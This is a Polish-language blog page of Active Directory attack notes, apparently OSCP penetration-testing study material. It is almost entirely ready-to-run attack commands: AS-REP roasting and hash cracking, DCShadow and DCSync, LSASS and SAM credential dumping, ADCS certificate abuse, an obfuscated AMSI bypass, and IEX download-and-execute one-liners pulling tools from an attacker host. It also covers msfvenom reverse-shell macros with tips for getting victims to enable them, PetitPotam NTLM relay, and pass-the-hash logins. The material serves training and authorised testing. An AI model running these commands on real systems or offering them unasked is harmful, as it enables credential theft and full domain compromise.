<p><em>Szukaj użytkowników bez wymaganego atrybutu wstępnego uwierzytelnienia Kerberos (<a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">DONT_REQ_PREAUTH</a>). Oznacza to, że każdy może wysłać żądanie AS_REQ do kontrolera domeny w imieniu dowolnego z tych użytkowników i otrzymać wiadomość AS_REP. Ten ostatni rodzaj wiadomości zawiera porcję danych zaszyfrowanych oryginalnym kluczem użytkownika, uzyskanym z jego hasła. Następnie za pomocą tej wiadomości hasło użytkownika może zostać złamane w trybie offline. Co więcej, do przeprowadzenia tego ataku nie jest potrzebne żadne konto domeny, a jedynie połączenie z DC. Jednak w przypadku konta domeny zapytanie LDAP może służyć do pobierania użytkowników bez wstępnego uwierzytelniania Kerberos w domenie. W przeciwnym razie nazwy użytkowników muszą zostać odgadnięte.</em>.</p>



<p><strong>###PowerView###</strong><br>#Get-DomainUser -PreauthNotRequired -Verbose<br><strong>###ASREPRoast.ps1###</strong><br>#import-module ASREPRoast.ps1<br>#invoke-ASREPRoast -verbose (jeżeli jest to od razu wygeneruje hash do złamania w john lub hydra)<br>#Invoke-ASREPRoast | select -ExpandProperty Hash &gt; hashdump<br>#john Plik.apreproast –wordlist=rockyou.txt<br>#hashcat -m 18200 –force -a 0 Plik.apreproast rockyou.txt<br>#jak ma hasło to loguje się na konto np. Enter-PSSession -ComputerName DC01 -credential corp\administrator<br><strong>###Impacket###</strong><br>##Check ASPREPRoast for all Domain Users (Credentials required)<br>#impacket-GetNPUsers corp.com/offsec:Password123! -request -format hashcat -outputfile Plik<br>#impacket-GetNPUsers corp.com/offsec:Password123! -request -format john -outputfile Plik<br>##Check ASPREPRoast for a List of Users (No Credentials required)<br>#impacket-GetNPUsers corp.com/ -usersfile Plik -format hashcat -outputfile Plik<br>#impacket-GetNPUsers corp.com/ -usersfile Plik -format john -outputfile Plik<br><strong>###Rubeus###</strong><br>#Rubeus.exe asreproast /format:hashcat /outfile:Plik.apreproast<br><strong>###Podatność Target Kerberoasting – AS-REPs – SET###</strong><br>#Get-ObjectAcl -SamAccountName * | ?{($_.ActiveDirectoryRights -match „GenericWrite”) -and ($_.SecurityIdentifier -match 'SID-USERA’)} (musisz mieć: GenericAll lub GenericWrite)<br>#Set-DomainObject -Identity hadams -XOR @{useraccountcontrol=4194304} -Verbose (na usera d októrego mamy prawa)<br>#&gt; Rubeus.exe asreproast /format:hashcat /outfile:Plik.apreproast<br>#john Plik.apreproast –wordlist=rockyou.txt<br>#hashcat -m 18200 –force -a 0 Plik.apreproast rockyou.txt<br><strong><mark style="background-color:#fcc5ff" class="has-inline-color">###AS-REP Roasting by oscp23###</mark></strong><br>#<em>atak offline na zaszyfrowaną część odpowiedzi z hasłem</em><br>#<mark style="background-color:#c1ffb3" class="has-inline-color">impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete</mark>  (na Kalim i IP to DC ;  musi byc user z wlaczona ta opcja w AD)   #&gt; tworzy plik #&gt; hashcat ten plik: sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force<br><strong>#—– Rubeus.exe</strong><br>#<mark style="background-color:#b9ffa9" class="has-inline-color">.\Rubeus.exe asreproast /nowrap</mark><br>#&gt; kopiuje cały wynik od $krb… do pliku „hashes.asreproast2” #&gt;   sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force<br><strong>#—-PowerView, znalezienie usera z takimi prawami</strong><br>#Get-DomainUser -PreauthNotRequired</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="SQL_Servers" ez-toc-data-id="#SQL_Servers"></span>SQL Servers<span class="ez-toc-section-end"></span></h4>



<p><strong>###<a href="https://github.com/The-Z-Labs/linux-exploit-suggester">PowerUpSQL</a>###</strong> <a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/ad-enumeration">tips</a><br>#Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose (Gather Information)<br>#Invoke-SQLAudit -Verbose -Instance #Serwer</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="DCShadow" ez-toc-data-id="#DCShadow"></span>DCShadow<span class="ez-toc-section-end"></span></h4>



<p><em>Wprowadzony jako funkcja Mimikatz (jako lokalne konto SYSTEM, bo to musi wykonać komputer, a nie user domenowy) w 2018 roku, pozwala uzyskać prawa administratora domeny. Podobnie jak DCSync chodzi o replikacje Kontrolera Domeny, Jak działa: podszycie się pod kontroler domeny, dokonanie dowolnej zmiany w AD i wysłanie tej zmiany na legalny kontroler. Potrzebna jest ta komenda opisująca zmianę w AD.</em></p>



<p><strong>###Wersja 1###</strong><br>#PsExec.exe -i -s cmd.exe (próba otwarcia nowego CMD jako SYSTEM)<br>#&gt;Lewy terminal: mimikatz: lsadump::dcshadow /object:[tutaj co chcemy zmienić na kontrolerze]  (np. zmień członkostwo w grupach np. dcshadow /object:student5 /attribute:badpwdcount /value:3333 LUB lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:SID-ENTERPRISE-ADMINS(zazwyczaj końcówka 519) – jak to się doda to jakby mamy uprawnienia do grupy Enterprise Admins, ale nie jesteśmy członkiem)<br>#&gt;Prawy terminal: lsadump::dcshadow /push<br><strong>###Wersja 2###</strong><br>#PsExec.exe -i -s cmd.exe<br>#lsadump::dcsync /user:jenkinsadmin (i mamy jego hash)<br>#&gt;sekurlsa::pth /user:jenkinsadmin /domain:corp /ntlm:HASH /run:powershell.exe (próbuj też zamiast normalny hash dać: 00000000000000000000000000000000)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Creds_Dumping" ez-toc-data-id="#Creds_Dumping"></span>Creds Dumping<span class="ez-toc-section-end"></span></h4>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93LSASS_Memory" ez-toc-data-id="#–LSASS_Memory"></span>–LSASS Memory<span class="ez-toc-section-end"></span></h5>



<p>#tasklist /fi „Imagename eq lsass.exe” (Get lsass.exe PID)<br>#&gt; C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump \Windows\Temp\lsass_dump.dmp full (Call comsvcs.dll and dump to file ; te pliki dll i exe sa juz na maszynie)<br>#Invoke-Mimikatz -Command „sekurlsa::Minidump lsass_dump.dmp”<br>#Invoke-Mimikatz -Command „sekurlsa::logonPasswords /full”<br><strong>###Mimikatz###</strong><br>#Invoke-Mimikatz -DumpCreds<br><strong>###Procdump (sysinternals)###</strong><br>#.\procdump.exe -accepteula -ma lsass.exe lsass_dump<br>#&gt; Mimikatz can then be used to pull information from the lsass_dump.dmp file: Invoke-Mimikatz -Command „sekurlsa::Minidump lsass_dump.dmp” #&gt; Invoke-Mimikatz -Command „sekurlsa::logonPasswords /full”</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93SAM" ez-toc-data-id="#–SAM"></span>–SAM<span class="ez-toc-section-end"></span></h5>



<p>#<mark style="background-color:#d5ffcc" class="has-inline-color">reg save HKLM\SAM c:\Exfiltration\SAM</mark><br>#<mark style="background-color:#c8ffbc" class="has-inline-color">reg save HKLM\SYSTEM c:\Exfiltration\SYSTEM</mark><br>#na Kali: samdump2 SYSTEM SAM<br>#wget „http://10.3.3.190/..%5C..%5C..%5C.. %5C..%5C..%5C/Windows/System32/config/RegBack/SAM.OLD”wget „http://10.3.3.190/..%5C..%5C..%5C.. %5C..%5C..%5C/Windows/System32/config/RegBack/SYSTEM.OLD”  #&gt;  python pwdump.py SYSTEM.OLD SAM.OLD<br><strong>###Crackmapexec###</strong><br>#crackmapexec smb -u offsec -p Password123! –sam<br>#crackmapexec smb -u student -p Password123! –sam –local-auth (jeżeli logujemy się lokalym userem a nie domenowym)<br><strong>###inne###</strong><br>#iex (New-Object Net.Webclient).DownloadString(„https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1”); Get-PassHashes<br><strong>###Metasploit###</strong><br>#use post/windows/gather/hashdump<br>#use post/windows/gather/credentials/credential_collector<br>#hashdump<br>#lsa_dump_sam (Kiwi)<br><strong>###Mimikatz###</strong><br>#Invoke-Mimikatz -command „lsadump::sam /system:SYSTEM /sam:SAM”<br>#Invoke-Mimikatz -command '”lsadump::sam”’ (2-ga metoda)</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93LSA_Secrets" ez-toc-data-id="#–LSA_Secrets"></span>–LSA Secrets<span class="ez-toc-section-end"></span></h5>



<p>#crackmapexec smb '10.10.10.100′ -u 'moe’ -p 'Password123′ –lsa<br><strong>###Metasploit###</strong><br>#use post/windows/gather/lsa_secrets<br><strong>###Mimikatz###</strong><br>#Invoke-Mimikatz -Command '”token::elevate” „lsadump::secrets”’</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Certyfikaty" ez-toc-data-id="#Certyfikaty"></span>Certyfikaty<span class="ez-toc-section-end"></span></h4>



<p><strong>###Certify <a href="https://github.com/GhostPack/Certify">link</a> ###</strong><br># .\Certify find /vulnerable<br># .\Certify.exe find /vulnerable /currentuser<br><strong>###Certipy <a href="https://github.com/ly4k/Certipy">link</a> i wiecej polecen <a href="https://github.com/0xsyr0/OSCP">tutaj</a>###</strong><br>#certipy find -dc-ip $IP -u $USER@$DOMENA -p $HASLO<br>#certipy find -dc-ip $IP -u $USER -p $HASLO -vulnerable -stdout<br><strong>###<a href="https://3haker.pl/sekurak-dlaczego-hackowanie-sieci-jest-proste-zobacz-cyberatak-na-zywo/">lab</a> sekurak###</strong><br>#proxychains4 -q certipy-ad find -u 'offsec@corp.com’ -dc-ip 192.168.209.10 -debug -vulnerable -stdout (u mnie na Kalim to certipy-ad w lab to certipy)<br>#&gt;proxychains4 -q certipy-ad req -u 'offsec@corp.com’ -dc-ip 192.168.209.10 -ca 'corp-WIN-xxxx-CA’ -template workstation -upn 'Administrator@corp.com’ (prosi o hash administratora na podstawie cert, nazwe szablonu wordstation oraz numer do -ca wział z poprzednich wyników)<br>#&gt; zapisuje mu jako plik: administrator.pfx<br>#&gt;proxychains4 -q python3 ./gettgtpkinit.py -cert-pfx administrator.pfx -dc-ip 192.168.209.10 -v corp.com/Adinistrator Administrator.ccache (skopiuj sobie ciag znaków biletu, ps. moga byc problemy z wersjami python 3.10 i 3.11)<br>#&gt; export KRB5CCNAME=Administrator.ccache<br>#&gt; proxychains4 -q python3 ./getnthash.py corp.com/Administrator -key 8axxxxxxxx -dc-ip 192.168.209.10 (po wykonaniu tego powinno pobrać NTLM hash)<br>#&gt; proxychains4 impacket-wmiexec corp.com/Administrator@192.168.209.10 -hashes :25xxxxxxxxxx ( loguje się do konsoli Kontrolera Domeny na pozysany hash)<br><strong>###PassTheCert###</strong><br>#certipy-ad cert -pfx $CERTYFIKAT.pfx -nokey -out $CERTYFIKAT.crt<br>#certipy-ad cert -pfx $CERTYFIKAT.pfx -nocert -out $CERTYFIKAT.key<br>#python3 passthecert.py -domain '$DOMENA’ -dc-host '$DOMENA’ -action 'modify_user’ -target '$USER’ -new-pass '$HASLO’ -crt ./.crt -key ./$CERTYFIKAT.key<br>#evil-winrm -i '$IP’ -u '$USER’ -p '$HASLO’</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Tools-2" ez-toc-data-id="#Tools-2"></span>Tools<span class="ez-toc-section-end"></span></h4>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="PowerView_Download" ez-toc-data-id="#PowerView_Download"></span>PowerView Download<span class="ez-toc-section-end"></span></h5>



<p>#<strong>musisz być lokalnym adminem: Import-Module .\PowerView.ps1</strong><br>#Bypass Windows Defender i AMSI: </p>



<pre class="wp-block-code"><code>1-Bypass AMSI
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

2-pobrać PowerView.ps1 z Kaliego
IEX(New-Object Net.Webclient).DownloadString('http://$IP:9090/PowerView.ps1')

3 - sprawdz czy działa:
Get-NetDomain</code></pre>



<p><strong>Download &amp; Execute</strong></p>



<pre class="wp-block-code"><code>powershell "IEX(New-Object Net.WebClient).downloadString('http://192.168.xx.xx:9090/PowerView.ps1')"

echo IEX(New-Object Net.WebClient).DownloadString('http://192.168.xx.xx:9090/PowerView.ps1') | powershell -noprofile (From <strong>cmd</strong> download and execute)

powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.xx.xx:9090/PowerView.ps1')|iex"
iex (iwr '192.168.xx.xx:9090/PowerView.ps1')</code></pre>



<p><strong>Download</strong></p>



<pre class="wp-block-code"><code><strong>(New-Object Net.WebClient).DownloadFile("http://192.168.xx.xx:9090/PowerView.ps1","C:\Tools\PowerView.ps1")</strong>

Invoke-WebRequest "http://192.168.xx.xx:9090:9090/PowerView.ps1" -OutFile "taskkill.exe"</code></pre>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="Mimikatz" ez-toc-data-id="#Mimikatz"></span>Mimikatz<span class="ez-toc-section-end"></span></h5>



<p>#C:\Tools\mimikatz_trunk\x64\mimikatz.exe<br>#token::elevate (zrzut sekretów)<br>#lsdump::secrets (interakcja z rejestrem i pobranie creds text)<br>#privilege::debug<br>#C:\Tools\kekeo\x64\kekeo.exe (wcześniej exit z mimikatz)<br>#privilege::debug (pomoc :: help #&gt; do modułu: privlege:: help)<br>#sekurlsa::tickets<br>#kerberos::list /export<br>#kerberos::purge (opróżniamy wszystkie istniejące bilety Kerberos) <br>#&gt; kerberos::list (weryfikacja biletów Kerberos) <br>#&gt; kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt<br>#&gt;kerberos::list (czy pojawił się nowy bilet załadowany do pamięci)<br>#lsadump::dcsync /user:Administrator<br>#spróbuj tak odpalić mimikatz.exe w <strong>evil-winrm</strong>: <mark style="background-color:#d3ffc9" class="has-inline-color">./mimikatz.exe „privilege::debug” „token::elevate” „sekurlsa::logonpasswords”  „exit”</mark>  (później zamien na: „lsadump::sam”  ;  warto tez „lsadump:secrets”)<br>#spróbuj tak odpalić mimikatz.exe w evil-winrm: ./mimikatz.exe „privilege::debug” „token::elevate” „sekurlsa::logonpasswords” „exit” (później zamien na: „lsadump::sam”)<br><strong>###RedTeam###</strong><br>#na Windows otwórz Manager zadań #&gt; zlokalizuj proces LSASS #&gt; Utwórz plik zrzutu #&gt; mimikatz&gt; sekurlsa::minidump lsass.dump #&gt; sekurlsa::logonpasswords<br></p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="PowerEmpire" ez-toc-data-id="#PowerEmpire"></span>PowerEmpire<span class="ez-toc-section-end"></span></h5>



<p>#uselistener http<br>#usestager windows/launcher_bat<br>#agents #&gt; interact #XXX<br>#sysinfo<br>#psinject http 6800<br>#usemodule situational_awarenees/network/powerview/get_user<br>#Wpis o <a href="https://3haker.pl/powershell-empire-post-exploitation-agent/">eskalacji</a> <br>#creds<br>#usemodule powershell/privesc/powerup/allchecks<br>#usemodule privesc/bypassuac_fodhelper<br>#usemodule credentials/mimikatz/logonpassword<br>#mimikatz &gt; sekurlsa::logonpasswords</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="ADReconps1" ez-toc-data-id="#ADReconps1"></span>ADRecon.ps1<span class="ez-toc-section-end"></span></h5>



<p>#powershell -ep bypass<br>#.\ADRecon.ps1 -OutputDir ALL-ADRecon -OutputType HTML (by udemy ; ps. mi na maszynach oscp nie zadzialalo)<br>#<a href="https://github.com/adrecon/ADRecon/blob/master/ADRecon.ps1">ADRecon.ps1</a>: .\ADRecon.ps1 -Method LDAP -DomainController $IP_DC -OutputDir ADRecon -OutputType HTML  (pytało później o login i hasło usera; domyslnie powinno bez przelaczników zadziałać, to zadziałało !!!)</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="Juicy_Potato" ez-toc-data-id="#Juicy_Potato"></span>Juicy Potato<span class="ez-toc-section-end"></span></h5>



<p>#Juicy Potato na <a href="https://github.com/ohpe/juicy-potato">git</a><br>#C:\Users\Public\JuicyPotato.exe -t t -p C:\Users\Public\whoami.exe -l 5837</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="BloodHound" ez-toc-data-id="#BloodHound"></span>BloodHound<span class="ez-toc-section-end"></span></h5>



<p># Import-Module ./SharpHound.ps1<br>#&gt;Invoke-BloodHound -CollectionMethod All -Verbose<br>#Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Tools\ -OutputPrefix „corp_audit” (oscp23)<br>#Invoke-BloodHound -CollectionMethod All -Domain corp.com -ZipFileName file.zip<br>#./SharpHound.exe –CollectionMethods All #&gt; Invoke-BloodHound -CollectionMethod All (jako .exe działa lepiej!)<br>#powershell.exe -exec Bypass -C „IEX(New-Object Net.Webclient).DownloadString(’http://:$IP/SharpHound.ps1′);Invoke-BloodHound” (Download and execute in memory)<br>#use post/windows/gather/bloodhound<br><strong>###działanie BloodHound###</strong><br>#czasami po imporcie odświeżanie<br>#Find shortest paths to Domain Admins<br>#kliknij na swojego usera (lub kilka obiektów np. tez komputer) i wybierz z menu kontekstowego: Mark user as owned #&gt; Shortest Paths to Domain Admins from owned Principal<br>#prawy przycisk na ścieżkę do kolejnego celu : Help &gt; Abuse info i będa payloady do wykorzystania<br><strong>###BloodHound python###</strong><br>#bloodhound-python -d $DOMENA -u $USERNAME -p „$HASLO” -gc $DOMENA -c all -ns $IP<br>#z Proxychaisn: proxychains bloodhound-python -u kiosk -p 'haslo’ -ns 10.10.125.250 -d SKYLARK.com -c all – -dns-tcp (ip controlera domeny)<br><strong><mark style="background-color:#fbbdff" class="has-inline-color">###oscp23###</mark></strong><br>#iwr -uri http://$KALI:8000/SharpHound.ps1 -Outfile SharpHound.ps1<br>#<mark style="background-color:#cbffbf" class="has-inline-color">powershell -ep bypass</mark> #&gt; <mark style="background-color:#ceffc3" class="has-inline-color">import-module .\sharphound.ps1</mark><br>#Get-Help Invoke-BloodHound<br>#<mark style="background-color:#dcffd4" class="has-inline-color">Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix „corp audit”</mark>  (zapisanie pliku na pulpicie, wszystkie mozliwe dane ; w komunikacie bedze liczba obiektow i wielkosc pliku)<br><strong>#—na Kalim:</strong><br>#sudo neo4j start #&gt; przeglądarka #&gt; domyślnie: neo4j / neo4j #&gt; nowe hasło: Password123!<br>#&gt;terminal: bloodhound #&gt; logowanie: nao4j / Password123!  #&gt; Upload data<br>#oznacz usera i komputery jako owned i użyj: Shortest Paths to Domain Admins from Owned Principals<br><strong>###Assimble the pieces###</strong><br>#<mark style="background-color:#ffb4c4" class="has-inline-color">Invoke-BloodHound -CollectionMethod All</mark><br>#Raw Query w stopce Bloodhound: <strong>MATCH (m:Computer) RETURN m  </strong>(listowanie komputerów w sieci) #&gt; kliknij na komputer aby w node poznać OS<br>#robimy nslookup każdej nowej maszyny aby poznać jej IP i dodaj do notatek<br>#<strong>raw query na userow: MATCH (m:User) RETURN m</strong>  (+ lista do notatek i do pliku users)<br>#zaznacz userów do których masz creds lub rev shell jako Owned (najlepij na tej planszy userow)<br>#skorzystaj z gotowego moduly: ’<strong>Find all Domain Admins</strong>’ query under the Analysis tab<br>#korzystaj z innych gotowców które od razu by pomogly: <strong>Find Workstations where Domain Users can RDP</strong>   +   <strong>Find Servers where Domain Users can RDP</strong>   +   <strong>Find Computers where Domain Users are Local Admin</strong>   +   <strong><mark style="background-color:#dbffd3" class="has-inline-color">Shortest Path to Domain Admins from Owned Principals</mark></strong><br>#niestety gotowce nic nam nie daly!<br><strong>#—-Sesje userów na maszynie</strong><br>#<strong><mark style="background-color:#d1ffc7" class="has-inline-color">MATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p</mark></strong><br>#szukamy maszyny gdzie domain admi ma aktyna sesje aby jako uprzywilejowany wykrasc NTLM<br>#sprobuj gotowego zapytania: <strong>List all Kerberoastable Accounts</strong>  #&gt; interesuje nas tylko inne konto niż krbtgt (bo to bedzie mialo trudne haslo)  #&gt; Node tego konta i sprawdzanie czy ma jakis SPN np. http/<br><strong>#—-inne</strong><br>#Find all unconstrained delegations excluding domain controllers: MATCH (c1:Computer)-[:MemberOf1..]-&gt;(g:Group) WHERE g.objectid ENDS WITH ’-516′ WITH COLLECT(c1.name) AS domainControllers MATCH (c2 {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2 <br>#Find constrained delegation :MATCH p=(u:User)-[:AllowedToDelegate]-&gt;(c:Computer) RETURN p Find users that can be AS-REP roasted: MATCH (u:User {dontreqpreauth: true}) RETURN u<br>#Find users with blank passwords that are enabled: MATCH (u:User) WHERE NOT u.userpassword IS null AND u.enabled = TRUE RETURN u.name,u.userpassword <br>#Find users having password in their description: MATCH (m:User) WHERE m.description CONTAINS 'password’ RETURN m.name, m.description <br>#Find domain users with interesting permissions against GPO: MATCH p=(u:User)-[r:AllExtendedRights|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|GpLink1..]-&gt;(g:GPO) RETURN p<br>#Find groups that can reset passwords : MATCH p=(m:Group)-[r:ForceChangePassword]-&gt;(n:User) RETURN p<br>#Find groups having local Admin privilege: MATCH p=(m:Group)-[r:AdminTo]-&gt;(n:Computer) RETURN p<br>#Find all users that have local admin rights: MATCH p=(m:User)-[r:AdminTo]-&gt;(n:Computer) RETURN p<br>#Find all active Domain Admin sessions: MATCH (n:User)-[:MemberOf]-&gt;(g:Group) WHERE g.objectid ENDS WITH ’-512′ MATCH p = (c:Computer)-[:HasSession]-&gt;(n) return p<br>#Find all Certificates templates: MATCH (n:GPO) WHERE n.type = 'Certificate Template’ RETURN n<br>#Find enabled certificates templates: MATCH (n:GPO) WHERE n.type = 'Certificate Template’ and n.Enabled = true RETURN n<br>#Find ESC1 Misconfigured Certificate Templates: MATCH (n:GPO) WHERE n.type = 'Certificate Template’ and n.<code>Enrollee Supplies Subject</code> = true and n.<code>Client Authentication</code> = true<br>and n.<code>Enabled</code> = true RETURN n<br>#Find ESC2 Misconfigured Certificate Template: MATCH (n:GPO) WHERE n.type = 'Certificate Template’ and n.<code>Enabled</code> = true and (n.<code>Extended Key Usage</code> = [] or 'Any Purpose’ IN<br>n.<code>Extended Key Usage</code>) RETURN n<br>#Find Certificate Authorities with HTTP verb enrollment (ECS8): MATCH (n:GPO) WHERE n.type = 'Enrollment Service’ and n.<code>Web Enrollment</code> = 'Enabled’ RETURN n</p>



<p><br></p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="Rubeus" ez-toc-data-id="#Rubeus"></span>Rubeus<span class="ez-toc-section-end"></span></h5>



<p>#xx</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="Impacket_z_Kali" ez-toc-data-id="#Impacket_z_Kali"></span>Impacket (z Kali)<span class="ez-toc-section-end"></span></h5>



<p>#impacket-smbserver local . -smb2support<br>#impacket-reg corp.com/offsec:Password123!:$HASH@$IP jakas_akcja jakas_akcja<br>#impacket-services corp.com/offsec:Password123!/$HASH&gt;@$IP jakas_akcja<br>#impacket-netview corp.com/offsec -targets /PATH/TO/FILE/Plik.txt -users /PATH/TO/FILE/Plik.txt<br>#impacket-lookupsid corp.com/offsec:Password123!/$HASH&gt;@$IP<br>#impacket-GetADUsers -all -dc-ip $IP corp.com/<br>#impacket-getST corp.com/offsec$ -spn WWW/DC01.corp.com -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator<br>#impacket-rpcdump corp.com/offsec:Password123!/$HASH&gt;@$IP<br>#impacket-samrdump corp.com/offsec:Password123!/$HASH&gt;@$IP<br>#impacket-atexec -k -no-pass corp.com/Administrator@DC01.corp.com 'type C:\PATH\TO\FILE\Plik’</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="Meterpreter_dla_AD" ez-toc-data-id="#Meterpreter_dla_AD"></span>Meterpreter dla AD<span class="ez-toc-section-end"></span></h5>



<p>#w sesji meterpreter: load extapi incognito kiwi powershell (extapi pozwala na enumeracje np. komputery, grupy itp.)<br>#np. &gt; adsi_user_enum DC01.medtech.com<br>#&gt; bg<br>#&gt;szuaj w msf :peas i wybierz exploit post: post/peass i okresl sesje<br>#<mark style="background-color:#d8ffcf" class="has-inline-color">getsystem -t 6</mark> podobno najlepiej działa z getsystem opcji<br>#powershell import /home/kali/…jakisscrupt.ps1 -s 1 (odpalanie skryptu ps.1 w osobnej sesji , przydatne np. kiedy w sesji musimy miec ticket lub podwyzszone uprwanienia ; -s 1 to chyba numer sesji)  #&gt; przejscie do tej sesji powershell_shell -s 1  #&gt; whoami /all i sprawdz czy masz np. Mandatory Hight</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Macro" ez-toc-data-id="#Macro"></span>Macro<span class="ez-toc-section-end"></span></h4>



<p><strong>###Macro do .doc OSCP 2023###</strong><br>#<a href="https://3haker.pl/macro-by-oscp/">tutaj</a> przykład z reverse-shell</p>



<p>Proste wywołujące Notatnik (by <a href="https://3haker.pl/active-directory-attacks-by-oscp-cz-6-macra/">oscp22</a>)</p>



<pre class="wp-block-code"><code>Sub mymacro()
Shell („notepad.exe”)
End Sub</code></pre>



<p><strong>###Macro payload z reverseshel dla VBScript</strong> <strong>###</strong><br>#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta<br>#&gt;kopiujemy string zaczynający się od: powershell<br>#&gt;używamy program do dzielenia na mniejsze części<br>#&gt;nasłuchowanie na Kalim i wykonanie pliku z macro na kompie ofiary</p>



<p>#Microsoft Word ma domyślnie wlaczony tryb blokowania Makr (user musi sam to wlaczyc)<br>#Dobrym pomyslem do przekonania do wlaczenia jest np. zamazane obrazu<br>#Wiele programów z Microsoft np. Publisher nie ma domyslnie włączonej blokady makr<br>#<a href="https://3haker.pl/macra-office-by-oscp-2023/">instrukcja</a> dodawani macr by oscp23<br>#plik Word z macrem powinnimy zapisywa jako .doc a nie .docx, alertnatywnie .docm tez przejdzie</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Windows_Library_Attacks" ez-toc-data-id="#Windows_Library_Attacks"></span>Windows Library Attacks<span class="ez-toc-section-end"></span></h4>



<p>#mają rozszerzenie <strong>.Library-ms</strong> i można je uruchomić, klikając je dwukrotnie (taki plikmozesz tez wyslac emailem)<br>#robisz: .lnk shortcut do swojego zasobu chyba<br>#musisz zainstalowa na Kalim serwer WebDAV: pip3 install wsgidav<br>#<a href="https://3haker.pl/atak-na-windows-library-library-ms-przy-uzyciu-webdav/">tutaj</a> cały lab jak krok po kroku zrobić złośliwy plik .Library-ms<br>#a <a href="https://3haker.pl/webdav-pod-wysylke-windows-library-attacks-oscp-23-asembling-pieces/">tutaj</a> dodatkowy lab z OSCP23 Asembling Pieces</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="PetitPotam_%E2%80%93_NTLM_Relay" ez-toc-data-id="#PetitPotam_–_NTLM_Relay"></span>PetitPotam – NTLM Relay<span class="ez-toc-section-end"></span></h4>



<p>#Kali 1 terminal (nasluchiwanie): python3 ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp -smb2support – -adcs – -template DomainController<br>#Kali 2 terminal: python3 PetitPotam.py -d purple.lab -u pentestlab -p Password1234 $KALI-IP $DC-IP  (<a href="https://github.com/topotam/PetitPotam">git</a>)<br>#Kali 2 kiedy nie mamy credsów: python3 PetitPotam.py 10.0.0.2 10.0.0.1<br>#lub z Windows zamiast Kali 2: PetitPotam.exe 10.0.0.2 10.0.0.1<br>#w Kali 1 powinno pobrac certyfikat w base64<br>#wykorzystanie cert w Rubeus: Rubeus.exe asktgt /user:DC$ /certificate:$TUTAJ-BASE64 /ptt<br>#powinno wygenerowac bilet kirbi #&gt; sprawdz przez klist i mimikatz:  lsadump::dcsync /user:krbtgt<br>#mimikatz pobranie hash Administrator (szukaj hash NTLM): lsadump::dcsync /domain:purple.lab /user:Administrator<br>#uzycie hasha: python3 wmiexec.py -hashes :58a478135a93ac3bf058a5ea0e8fdb71 Administrator@10.0.0.1</p>



<p></p>
<span class="edit-link"><a class="post-edit-link" href="https://3haker.pl/wp-admin/post.php?post=23711&amp;action=edit">Edytuj</a></span>	</div>
